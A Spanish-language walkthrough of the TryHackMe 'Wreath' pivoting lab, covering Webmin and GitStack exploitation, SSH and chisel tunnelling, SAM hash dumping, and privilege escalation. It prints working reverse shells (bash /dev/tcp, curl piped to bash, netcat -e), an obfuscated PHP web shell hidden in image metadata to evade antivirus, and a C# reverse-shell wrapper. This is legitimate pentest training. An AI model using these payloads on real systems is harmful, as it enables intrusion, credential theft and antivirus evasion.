---
title:  "Wreath - Writeup - TryHackme"
categories: 
  - TryHackme
tags:
  - Windows
  - Linux
  - eCPPT
toc: true
toc_label: "Tabla de contenido"
---

[Wreath](https://tryhackme.com/room/wreath) es un excelente laboratorio que contiene un conjunto de máquinas vulnerables y que solo podrás acceder a un grupo de ellas solo si de antes has vulnerado ciertas máquinas, es decir tendrás que **pivotar**.

En esta máquina podrás aprender sobre **Pivoting**, **Técnicas sencillas de evasión de antivirus**, **Empire C2 (mando y control)**, entre otras cosas.

[Wreath](https://tryhackme.com/room/wreath) es muy recomendado realizarlo como preparación previa a la certificación del **eCPPT**.

## Reconocimiento

Esta es la fase inicial y mas importante, ya que de esta dependerá todo nuestro proceso.

Recuerden que mientras más información de nuestro objetivo obtengamos, mas vías potenciales de explotación podríamos obtener.

### Puertos abiertos

**Comando:**

```python
nmap -sS --min-rate 400 -p- --open -n -v -Pn -oN openPorts 10.200.198.200
```

**Resultado:**

```python
# Nmap 7.91 scan initiated Tue Oct  5 11:05:11 2021 as: nmap -sS --min-rate 400 -p- --open -n -v -Pn -oN openPorts 10.200.198.200
Nmap scan report for 10.200.198.200
Host is up (0.29s latency).
Not shown: 65530 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
443/tcp   open  https
10000/tcp open  snet-sensor-mgmt

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Oct  5 11:12:06 2021 -- 1 IP address (1 host up) scanned in 414.48 seconds
```

### Servicios y versiones

Una vez que sabemos que puertos están abiertos en nuestro objetivo, deberemos realizar un escaneo más exhaustivo sobre los mismos.

**Comando:**

```python
nmap -sV -sC -p22,80,443,10000 -oN serviciosVeriones 10.200.198.200
```

**Resultado:**

```python
# Nmap 7.91 scan initiated Tue Oct  5 11:12:50 2021 as: nmap -sV -sC -p22,80,443,10000 -oN serviciosVeriones 10.200.198.200
Nmap scan report for thomaswreath.thm (10.200.198.200)
Host is up (0.21s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2021-10-05T15:10:21
|_Not valid after:  2022-10-05T15:10:21
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  5 11:13:37 2021 -- 1 IP address (1 host up) scanned in 47.03 seconds
```

### Servicios Web

#### 1. Puerto 443
   ![Pagina web de Thomas](/assets/images/report/webPrincipal.png)

#### 2. Puerto 10000
  ![Webmin Servie](/assets/images/report/webMinThomas.png)

#### 3. Webmin

Como hemos visto en el puerto `10000` se aloja un servicio `Webmin` y que si revisamos nuestros resultados de [nmap](https://hacknotes.gitgub.io/tryhackme/wreathWriteUp/#servicios-y-versiones) veremos que la versión de este servicio es `1.890`.

Si buscamos esta versión del servicio `Webmin` notaremos que es una versión vulnerable y que gracias a ello podremos ejecutar comandos sobre el sistema que lo aloja.

Existen varios `exploits` para esta vulnerabilidad, pero en este caso yo utilizare mi propia variante. Pueden ejecutar cualquier comando pero para este caso iremos directo a obtener un `reverse shell`.

**Necesitaremos:**

- [webminExploit.py](https://github.com/hacknotes/CVE-2019-15107-Exploit)
- Reverse shell `(exploit.sh)`.
- Habilitar un servidor web.

**exploit.sh**

```python
bash -i >& /dev/tcp/10.50.195.140/443 0>&1
```

**Servidor Web**

```python
python -m SimpleHTTPServer 80
```

**Comando:**

```python
python3 webminExploit.py 10.200.198.200 10000 "curl http://10.50.195.140/exploit.sh | bash"
```

![Webmin Exploit](/assets/images/report/firstTarget.png)

Como hemos visto al realizar los pasos anteriores hemos sidos capaces de obtener una reverse shell sobre el sistema que aloja el servicio `Webmin 1.890`.

## Prod-serv

Una vez dentro como ya estamos ejecutando comandos como un usuario privilegiado `(root)` ya solo nos faltaría hacer un reconocimiento interno de la máquina.

Hay muchas cosas que deberían ser parte del reconocimiento interno y que deberían probarlas, pero para este caso iré directo con la resolución de este laboratorio.

### Llave SSH

Gracias al reconocimiento encontramos una clave privada `ssh` de `root`, esto nos servirá para mantener persistencia en esta `máquina`.

![Webmin Exploit](/assets/images/report/idrsaRootWreath.png)

### Barrido de ping

Esto nos permitirá conocer si desde la máquina que nos encontramos somos capaces de comunicarnos con otros activos de la red.

Para llevar a cabo lo mencionado con anterioridad lo podemos hacer de varias maneras, en este caso he decidido subir un binario estático de [nmap](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64).

![Ping sweep](/assets/images/report/internalHost.png)

Vemos que obtenemos varios `host` activos.

De estos deberíamos descartar el `.200` que es la máquina víctima en la que nos encontramos actualmente y la `.250` que es el host que aloja el servidor `OpenVPN` y que **no** forma parte de esta red vulnerable.

Para el resto de host en este punto nos interesa saber que servicios alojan para lo cual deberíamos hacer un escaneo de puertos.

### Escaneo de puertos

Aquí podemos utilizar el mismo binario de [nmap](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64) que subimos anteriormente en la máquina o utilizar un script como el siguiente.

**portScan.sh**

```bash
#!/bin/bash

host=("10.200.198.250")

for host in ${hosts[@]};do
	echo -e "\n Ports on $hosts\n"
	for port in $(seq 1 65535); do
		timeout 1 bash -c "echo '' > /dev/tcp/$hosts/$port" 2> /dev/null && echo "[+] PORT $port - OPEN " &
	done; wait
done
```

```python
./portScan.sh
```

![Puertos del host 10.200.198.150](/assets/images/report/portsOf150.png)

### Pivoting

En el escaneo de puertos anterior observamos que el host `10.200.198.150` aloja varios servicios, entre ellos un servicio web por el puerto `80`.

Para ver el contenido de este servicio existen varias técnicas que nos serian de ayuda. En este caso yo decidí utilizar [sshuttle](https://github.com/sshuttle/sshuttle#obtaining-sshuttle) que utiliza una conexión `SSH` para crear un proxy tunelizado simulando una `VPN`, además como utiliza `SSH` cualquier cosa que enviemos a través del túnel sera encriptada.

```python
sshuttle -r root@10.200.198.200 --ssh-cmd "ssh -i idrsa" 10.200.198.0/24 -x 10.200.198.200
```

Del comando anterior deberemos tomar en cuenta que como estamos trayendo toda la red `10.200.198.0/24` deberemos excluir el host al cual nos estamos conectando para evitar interrumpir la conexión, esto lo logramos con el parámetro `-x`.
{: .notice--danger}

![sshuttle](/assets/images/report/sshuttle.png)

Una vez realizado lo anterior deberíamos obtener como resultado `C: Connected to server` y además ya podremos visualizar el contenido alojado en el host `10.200.198.150` por el puerto `80`.

![GitStack](/assets/images/report/gitstack.png)


![GitStack](/assets/images/report/gitstack1.png)

Vemos que este servicio es un `GitStack` y si buscamos `exploits` sobre el mismo encontraremos los siguientes:

```bash
searchsploit gitstack
```

![GitStack Exploit](/assets/images/report/gitstackexploit.png)

Este `exploit` nos permite ejecutar comandos sobre el sistema como el usuario que esta ejecutando el servicio.

Debemos ubicar nuestro comando o comandos en la variable `command`.

![View Exploit](/assets/images/report/exploitpy.png)

Una vez indicados los comandos solo deberemos ejecutar el exploit para obtener los resultados de los mismos. 

```bash
python 43777.py
```

![Exploit Result](/assets/images/report/resultExploitGitslak.png)

Podemos ver que gracias a los resultados del comando anterior somos el usuario `nt authority\system` y que nos encontramos en el host `10.200.198.150`.

Como somos un usuario con privilegios pero no sabemos su contraseña para acceder al sistema podemos crear un nuevo usuario y agregarlo al grupo de `Administrators` y al grupo `Remote Management Users`

![New User](/assets/images/report/addnewuser.png)

## Git-serv

Una vez creado nuestro usuario y recordando nuestros resultados del [escaneo anterior](https://hacknotes.github.io/tryhackme/wreathWriteUp/#escaneo-de-puertos) sabemos que a este host podremos acceder por `RDP (3389)` o por `WinRM (5985)`.

### RDP

A diferencia de `WinRM`, `RDP` nos permitirá ingresar al sistema pero de manera gráfica.

```python
xfreerdp /v:10.200.198.150 /u:jch /p:jch123 +clipboard /dynamic-resolution /drive:.,share
```

En el comando anterior he especificado `/drive:.,share` que nos permitirá crear una carpeta compartida de la ruta actual.
{: .notice--danger}

![Share with rdp](/assets/images/report/sharewithrdp.png)

Gracias a `RDP` podremos ejecutar una `linea de comandos` como el usuario **administrador**.

![cmd as admin](/assets/images/report/cmdasadmin.png)

#### Obtención de hashes

Podemos obtener los hashes de las cuentas de usuario que se encuentren registrados en el sistema por medio de la obtención del archivo `SYSTEM` y `SAM`.

Los siguientes comandos nos permitirán hacer una copia de estos archivos y guardarlos en nuestra carpeta compartida para posteriormente intentar romperlos y posiblemente obtener credenciales en texto plano. 

```php
reg save HKLM\SAM C:\Users\jch\Desktop\SAM
reg save HKLM\SYSTEM C:\Users\jch\Desktop\SYSTEM
```

![sam and system](/assets/images/report/samsystem150.png)

#### Craqueo de hashes

La herramienta `pwdump.py` nos permite obtener los hashes por medio de los archivos `SYSTEM` y `SAM`, para posteriormente intentarlos romper.

```python
python3 /opt/Tools/Windows/creddump7/pwdump.py SYSTEM SAM
```

![hashes](/assets/images/report/hashes150.png)

Como vemos en la imagen anterior pudimos obtener los hashes de las cuentas de usuario del sistema, estos hashes los podemos intentar romper en paginas como [crackstation](https://crackstation.net/).

![crack hashes](/assets/images/report/crackhashes.png)

Gracias a esta pagina pudimos obtener una contraseña en texto claro, en este caso del usuario **Thomas**.

### WinRM

Con el siguiente comando podremos obtener una shell como el usuario que creamos anteriormente.

```python
evil-winrm -i 10.200.198.150 -u jch -p jch123 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
```

En el comando anterior he especificado `-s` que esto permite pasarle como parámetro una ruta donde se alojen `scripts` en `powershell`.
{: .notice--danger}

![Access new user](/assets/images/report/accessnewuser.png)

#### Pass the hash

Si recordamos anteriormente pudimos obtener una contraseña en texto plano, sin embargo esta no fue del usuario `Administrador`, pero si desearíamos obtener una shell como este usuario podríamos usar la técnica `Pass the hash` que esto nos permitiría que sin conocer la contraseña del usuario podamos acceder como este por medio de su `hash`.

![Shell as admin on gitslack](/assets/images/report/shellasadmingitslack.png)

#### Website.git

Si seguimos enumerando esta máquina encontraremos `Website.git`. Para poder tener un mejor análisis de lo encontrado procederemos a descargarlo.

![download website git](/assets/images/report/downloadwebsitegit.png)

Como se trata de un archivo `.git` lo mas óptimo seria trabajar con [GitTools](https://github.com/internetwache/GitTools) para poder extraer su contenido y poder analizarlo.

Para ello necesitaremos:

- Ubicarnos en el archivo descargado.
- Cambiar el nombre de su contenido por `.git`.
- Clonar el repositorio de [GitTools](https://github.com/internetwache/GitTools).
- Extraer el contenido.

```php
cd Website.git
mv C:\\GitStack\\repositories\\Website.git .git
git clone https://github.com/internetwache/GitTools
```

![Download GitTools](/assets/images/report/gittools.png)

El siguiente comando nos permitirá extraer el contenido del archivo `.git` y depositarlo en un directorio llamado `Website`, pero como este directorio aun no existe nos saldrá una advertencia. Lo puedes crear si deseas o se creara solo con el mismo comando.

```php
GitTools/Extractor/extractor.sh . Website
```

![Extract data](/assets/images/report/extractgittools.png)

Como sabemos que el sitio web interpreta código `php` deberemos buscar archivos con ese tipo de extensión.

```python
find . -name  "*.php"
```

![Find data](/assets/images/report/finddata.png)

Obtenemos dos archivos pero no sabemos cual de ellos es el archivo actual, pero si sabemos que se esta trabajando con `Gitstack` y sabemos que esto lleva el control de las versiones, además sabemos que cada nueva versión que se cree del proyecto contara con un archivo `commit-meta.txt` el cual nos sera de ayuda para saber cual fue la última actualización de un proyecto.

El siguiente comando nos extrae la data que contiene `commit-meta.txt` y nos la representa por pantalla.

```python
separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$s>
```

De este resultado debemos prestar atención al nombre del directorio y su campo `parent`.

El archivo que **no** contiene el campo `parent` significa que es el proyecto inicial.

El archivo que en su campo `parent` contiene el nombre de otro significa que es hijo o que proviene del archivo con ese nombre.

Dicho esto entonces sabemos que la última actualización se encuentra en el arcivo `1-345ac8b236064b431fa43f53d91c98c4834ef8f3` y es en este que procederemos a analizar el fichero `index.php`

![Updated post](/assets/images/report/updatefilter.png)

```python
cd 1-345ac8b236064b431fa43f53d91c98c4834ef8f3/
nano resources/index.php
```

En este archivo pudimos encontrar un código vulnerable que permite la carga de imágenes a la máquina que aloja este servicio.

```python
...

if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
                $target = "uploads/".basename($_FILES["file"]["name"]);
                $goodExts = ["jpg", "jpeg", "png", "gif"];
                if(file_exists($target)){
                        header("location: ./?msg=Exists");
                        die();
                }
                $size = getimagesize($_FILES["file"]["tmp_name"]);
                if(!in_array(explode(".", $_FILES["file"]["name"])[1], $goodExts) || !$size){
                        header("location: ./?msg=Fail");
                        die();
                }
                move_uploaded_file($_FILES["file"]["tmp_name"], $target);
                header("location: ./?msg=Success");
                die();
        } else if ($_SERVER["REQUEST_METHOD"] == "post"){
                header("location: ./?msg=Method");
        }

...
```

#### Escaneo de puertos

Una vez dentro podemos invocar nuestros `scripts` de la ruta que le pasamos como parámetro como vimos en la [sección anterior](https://hacknotes.github.io/tryhackme/wreathWriteUp/#winrm).

En este caso invocare `Invoke-Portscan` que nos permitirá escanear los puertos de un host.

```python
Invoke-Portscan.ps1
Get-Help Invoke-Portscan
Invoke-Portscan -Hosts 10.200.198.100 -TopPorts 50
```

![Invoke port scan](/assets/images/report/invokeportscan.png)

Observamos que el host que le pasamos como parámetro cuenta con servicios activos, entre ellos un servicio web por el puerto `80`.

En este punto si deseamos ver que contenido aloja dicho servicio nuevamente tendremos que `pivotar`.

### Pivoting

Para este caso como ya estamos anteriormente conectados por [SSH con sshuttle](https://hacknotes.github.io/tryhackme/wreathWriteUp/#pivoting) para acceder tanto a los recursos como a la máquina actual `(10.200.198.150)`, lo mas cómodo para obtener acceso a los recursos que aloja la otra máquina `(10.200.198.100)` seria aprovecharnos de la herramienta `chisel` para hacer un envió de proxy.

**Necesitaremos:**

- Subir `chisel` a nuestra máquina actual `(10.200.198.150)`.
- Abrir un puerto en el firewall de windows para permitir que se realice la conexión de reenvío.
- Establecer la conexión.

#### Chisel

Para subir `chisel` es muy fácil ya que la herramienta `evil-winrm` cuenta con el comando `upload` que nos permitirá subir el binario mencionado.

```python
upload chisel64.exe
```

![Upload chisel](/assets/images/report/uploadchisel.png)

#### Firewall

Con el siguiente comando podremos abrir un puerto en el firewall de windows para permitir una conexión de reenvío.

```python
netsh advfirewall firewall add rule name="Forward-SOCKS-Proxy" dir=in action=allow protocol=tcp localport=47000
```
#### Conexión

Para establecer la conexión necesitaremos ejecutar el siguiente comando en la máquina víctima actual `(10.200.198.150)`.

```python
.\chisel64.exe server -p 47000 --socks5
```

El puerto indicado en el comando anterior debe ser el mismo puerto que abrimos en el [paso anterior](https://hacknotes.github.io/tryhackme/wreathWriteUp/#firewall).
{: .notice--danger}

Ya establecido nuestro servidor podremos ejecutar el siguiente comando en nuestra máquina local de atacante para poder conectarnos al [servidor](https://hacknotes.github.io/tryhackme/wreathWriteUp/#proxy) establecido con anterioridad para poder acceder a los recursos de la otra máquina `(10.200.198.100)`.

```python
./chisel client 10.200.198.150:47000 8080:socks
```

En el comando anterior podemos observar que nos estamos conectando a la ip `10.200.198.150` por el puerto `47000`, esto debido a que es nuestro servidor. También podemos observar que como parámetro esta el puerto `8080`, este nos servirá para poder visualizar el contenido que aloja la nueva víctima `(10.200.198.100)` tras abrir este puerto de manera local en nuestra máquina de atacante y crear un proxy con el.
{: .notice--danger}

![Forward SOCKS Proxy](/assets/images/report/forwardsocksproxy.png)

#### FoxyProxy

Una vez establecida la conexión podremos crear nuestro proxy con la extensión para navegadores `foxyproxy`.

![Foxy Proxy](/assets/images/report/foxyproxy.png)

Muy importante poner el numero de puerto abierto con anterioridad, en este caso el `8080`. También es importante poner el tipo de proxy como `SOCKS5` ya que chisel trabajo con ese tipo de proxy.
{: .notice--danger}

Una vez realizado lo anterior si nos dirigimos a la dirección `10.200.198.100` y con `foxyproxy` activado seremos capaces de ver el contenido que aloja el último objetivo.

![Web interna](/assets/images/report/webinterna.png)

Si nos percatamos a primera vista esta es la misma pagina web que se nos presentaba en el primer host `(10.200.198.200)`, además también sabemos que contamos con un servidor `GitStack` por lo cual se debe estar haciendo un control de versiones con esta pagina local en `(10.200.198.100)` y con la pagina de cara al publico en `(10.200.198.200)`.

## Wreath-pc

Gracias a que habíamos encontrado de antes el [proyecto](http://localhost:4000/tryhackme/wreathWriteUp/#websitegit) en `Git-serv` sabemos que este sitio cuenta con una funcionalidad que permite la carga de imágenes en la ruta `/resources` y que su código fuente no cuenta con un buen filtro a la hora de cargar las imágenes.

No olvidemos que en todo momento estamos pasando por nuestro [proxy](https://hacknotes.github.io/tryhackme/wreathWriteUp/#conexi%C3%B3n) y por el túnel de [ssh](https://hacknotes.github.io/tryhackme/wreathWriteUp/#pivoting) por lo cual estas conexiones deben estar activas.
{: .notice--danger}

Dicho esto y con el `foxyproxy` activo podemos dirigirnos a la ruta `/resources`de web.

### Servicio Web

Vemos que nos pide una contraseña y como de antes habíamos obtenido una [contraseña](https://hacknotes.github.io/tryhackme/wreathWriteUp/#craqueo-de-hashes) en texto plano a través del craqueo de un hash, probaremos si existe reutilización de contraseñas.

![Upload site](/assets/images/report/uploadwebsite.png)
![Upload site](/assets/images/report/uploadwebsitewithpass.png)

En efecto la misma [contraseña](https://hacknotes.github.io/tryhackme/wreathWriteUp/#craqueo-de-hashes) de Thomas que obtuvimos antes nos sirvió para acceder a este recurso de carga de imágenes.

#### Web Shell

Como sabemos que este servicio web interpreta código `php` y que podemos subir una imagen intentaremos insertar nuestra `web shell` en los meta datos de nuestra imagen.

```php
<?php
    $cmd = $_GET["cmd"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

Algo a tomar en cuenta es que esta última máquina cuenta con un antivirus activado como se menciona en la propia sala de [Tryhackme](https://tryhackme.com/room/wreath) por lo cual debemos tener cuidado al momento de cargar nuestra `web shell`.

#### Web Shell Ofuscada

La [web shell](https://hacknotes.github.io/tryhackme/wreathWriteUp/#web-shell) anterior nos servirá para ponerla en nuestra imagen pero esta seria detectada fácilmente, por lo cual usaremos [php ofuscator](https://www.gaijin.at/en/tools/php-obfuscator) para ofuscarla y pasar desapercibidos.

![Webshell ofuscada](/assets/images/report/ofuscatewebshell.png)

Para ofuscar nuestra [web shell](https://hacknotes.github.io/tryhackme/wreathWriteUp/#web-shell) es tan fácil como copiarla y pegarla en [php ofuscator](https://www.gaijin.at/en/tools/php-obfuscator), activar todas las opciones y presionar en `Obfuscate Source Code` como podemos observar en la imagen anterior.

**Resultado:**

```php
<?php $e0=$_GET[base64_decode('Y21k')];if(isset($e0)){echo base64_decode('PHByZT4=').shell_exec($e0).base64_decode('PC9wcmU+');}die();?>
```

#### Imagen

Con los siguientes comando podemos ver que nuestro archivo elegido es de tipo `JPEG` y como comentario tiene `foto`.

```php
file jch.jpeg
exiftool jch.jpeg | grep Comment
```

En este punto insertaremos nuestra `web shell ofuscada` en nuestra imagen y volveremos a revisar que tenemos como comentario.

Muy importante antes de insertar nuestra `web shell ofuscada` como comentario en nuestra imagen **debemos** escapar el carácter `$` con `\` ya que si no nuestra consola lo interpretara como variables y nos dará un error.
{: .notice--danger}

```php
exiftool -Comment="<?php \$e0=\$_GET[base64_decode('Y21k')];if(isset(\$e0)){echo base64_decode('PHByZT4=').shell_exec(\$e0).base64_decode('PC9wcmU+');}die();?>" jch1.jpeg
exiftool jch.jpeg | grep Comment
```

Como paso final tras haber insertado ya nuestra `web shell ofuscada` como comentario podemos revisar que nuestro archivo aun es una imagen.

El nombre de esta imagen debe ser cambiada con una doble extensión como `.jpeg.php` ya que de lo contrario la web no interpretara nuestro código `php`.
{: .notice--danger}

```bash
file jch.jpeg
mv jch.jpeg jch.jpeg.php
```

![Process to ofuscade webshell](/assets/images/report/processtometadata.png)

Si subimos nuestra imagen veremos que seremos capaces de burlar el filtro con el que cuenta esta web y que nuestra imagen sera guardada en la máquina que aloja este servicio.

Es posible nuestra imagen no aparezca al momento de tratar de subirla. Lo único que debes hacer en la ventana emergente que se te despliega es poner **Todos los archivos** `(All Files)`.
{: .notice--danger}

![Upload image](/assets/images/report/uploadimage.png)

### RCE

Si nos dirigimos a la ruta `/resources/uploads/nombre-de-nuestra-imagen.jpeg.php` y le agregamos `?cmd=<comando>` veremos que tendremos la capacidad de ejecutar comandos sobre la máquina que aloja este servicio web.

```python
http://10.200.198.100/resources/uploads/jch.jpeg.php?cmd=ipconfig
```

![RCE last target](/assets/images/report/rcelasttarget.png)

#### Reverse Shell

Como ya estamos ejecutando comando sobre el sistema lo que sigue sera obtener una `reverse shell` para lo cual necesitaremos:

- Montar un servidor web en nuestra máquina de atacante.
- Subir `netcat` a la víctima.
- Ponernos a la escucha por un puerto.
- Enviarnos la `reverse shell`.

**Servidor Web**

```python
python -m SimpleHTTPServer 9090
```

Algunos de los comandos que ejecutaremos cuentan con caracteres especiales por lo cual es buena practica antes de enviar nuestro comando ponerlo en formato `url`, para ello yo usare [urlencoder.io](https://www.urlencoder.io/).

**Comando**

```python
curl http://10.50.195.140:9090/nc64.exe -o nc64.exe
```

**Formato URL**

```python
curl%20http%3A%2F%2F10.50.195.140%3A9090%2Fnc64.exe%20-o%20nc64.exe
```

Hecho lo anterior ya tendremos `netcat` en nuestra máquina víctima, por lo cual solo nos haría falta ponernos en escucha por un puerto y ejecutar un comando para obtener nuestra `reverse shell`.

```python
rlwrap nc -nlvp 443
```

**Comando**

```python
C:\xampp\htdocs\resources\uploads\nc64.exe -e cmd.exe 10.50.195.140 443
```

**Formato URL**

```python
C%3A%5Cxampp%5Chtdocs%5Cresources%5Cuploads%5Cnc64.exe%20-e%20cmd.exe%2010.50.195.140%20443
```

![netcat on last target](/assets/images/report/netcatlasttarget.png)

Como vemos en la imagen anterior hemos conseguido nuestra `web shell` en la máquina `10.200.198.100` como el usuario Thomas.

### Escalada de privilegios

En este caso estamos ejecutando comandos como un usuario con pocos privilegios, por lo cual deberemos enumerar vías potenciales para convertirnos en un usuario con privilegios elevados `(nt authority\system)`.

```python
whoami /priv
```

![Se Impersonate privilege](/assets/images/report/seimpersonateprivilege.png)

Podemos ver que `SeImpersonatePrivilege` esta activado lo cual quiere decir que para convertirnos en `nt authority\system` sera muy fácil ya que para aprovecharnos de este privilegio existen varias herramientas y métodos.

#### Print Spooler

En este caso yo utilizare [Print Spooler](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0) ya que su uso es muy fácil como ejecutarlo y pasarle como parámetro a `-c` que queremos que se ejecute.

```python
PrintSpoofer64.exe -i -c cmd.exe
```

Tras ejecutar el comando anterior vemos que efectivamente nos hemos convertido en `nt authority\system` teniendo todo el control del sistema ahora.

![Privilege scalation Se Impersonate privilege](/assets/images/report/privilegescalate.png)

#### Unquoted Service Path

Si seguimos enumerando este máquina veremos hay mas métodos de escalar privilegios.

Con los siguientes comandos podemos buscar servicios que cuenten con espacios pero sin estar entre comillas en su ruta ejecutable.

```python
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\windows\\" | findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
```

![Unquoted path](/assets/images/report/unquotedpath.png)

Efectivamente como podemos ver en la imagen anterior esta máquina cuenta con servicios con su ruta ejecutable con espacios y sin comillas.

Esto nos permitirá insertar un binario que nos permita obtener una reverse shell con privilegios del sistema.

No todos los servicios con su ruta de ejecución vulnerable cuentan con privilegios sobre el sistema.
{: .notice--danger}

Para abusar de esta vulnerabilidad necesitaremos:

- Crear un archivo `(Wrapper.cs)` en `C` que nos permita obtener una reverse shell.
- Compilar el archivo `Wrapper.cs`.
- Subir `(Wrapper.cs` a la máquina víctima.
- Ponernos en escucha por un puerto
- Reiniciar el servicio vulnerable

Como de antes ya habíamos cargado `netcat` en este sistema lo volveremos a utilizar indicando su ruta absoluta y ejecutando un comando en el siguiente script.

**Wrapper.cs**

```python
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            Process proc = new Process();
	    ProcessStartInfo procInfo = new ProcessStartInfo("C:\\xampp\\htdocs\\resources\\uploads\\nc64.exe", "10.50.195.140 444 -e cmd.exe");
	    procInfo.CreateNoWindow = true;
            proc.StartInfo = procInfo;
            proc.Start();
        }
    }
}
```

**Compilación de `Wrapper.cs`**

Para poder compilar un archivo para windows en linux necesitaremos instalar `mono-devel`.

Una vez instalado `mono-devel` podemos compilar nuestro archivo `Wrapper.cs` y observaremos que nos crea un nuevo archivo ejecutable para windows `(Wrapper.exe)`. 

```php
sudo apt install mono-devel
mcs Wrapper.cs
file Wrapper.exe
```

**Subir el archivo `Wrapper.cs`**

```python
[*] En nuestra máquina local de atacante:

python -m SimpleHTTPServer 9090

[*] En la máquina victia actual:

curl http://10.50.195.140:9090/Wrapper.exe -o Wrapper.exe
```

Una vez con el archivo `Wrapper.exe` debemos ubicarlo en la ruta vulnerable del servicio **en este caso** como `System.exe`.

```python
C:\xampp\htdocs\resources\uploads\Wrapper.exe "C:\Program Files (x86)\System Explorer\System.exe"
```

Para poder cerciorarnos que nuestro archivo se encuentra donde lo ubicamos podemos ejecutar lo siguiente.

```python
dir "C:\Program Files (x86)\System Explorer\"
```

![Copy wrapper.exe](/assets/images/report/wraperexe.png)

Antes de reiniciar el servicio vulnerable deberemos estar en escucha por el mismo puerto que indicamos en nuestro archivo `Wrapper.cs` antes de compilarlo.

```python
rlwrap nc -nlvp 444
```

Ya en escucha lo último que tenemos que hacer es reiniciar el servicio.

```php
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

![Shell as root](/assets/images/report/rootshell.png)

Como podemos observar nuevamente pudimos obtener una `reverse shell` pero en este caso por medio de una vulnerabilidad de tipo `Unquoted Service Path`.

### WinPEAS

Adicionalmente quiero mencionar que los resultados de las vulnerabilidades o permisos mal configurados lo hubiéramos podido enumerar de forma automática con la herramienta [winPEAS.exe](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases)

Una gran característica con la que cuenta esta herramienta es que para cada cosa reportada te adjunta un enlace en el cual te explican que es y como aprovecharte de lo reportado.

```php
.\winPEASany.exe
```

![Winpeas result](/assets/images/report/winpeasseimpersonateprivilege.png)

![Winpeas result](/assets/images/report/winpeasseunquotedpath.png)

![Thoma's credential](/assets/images/report/credofthomas.png)
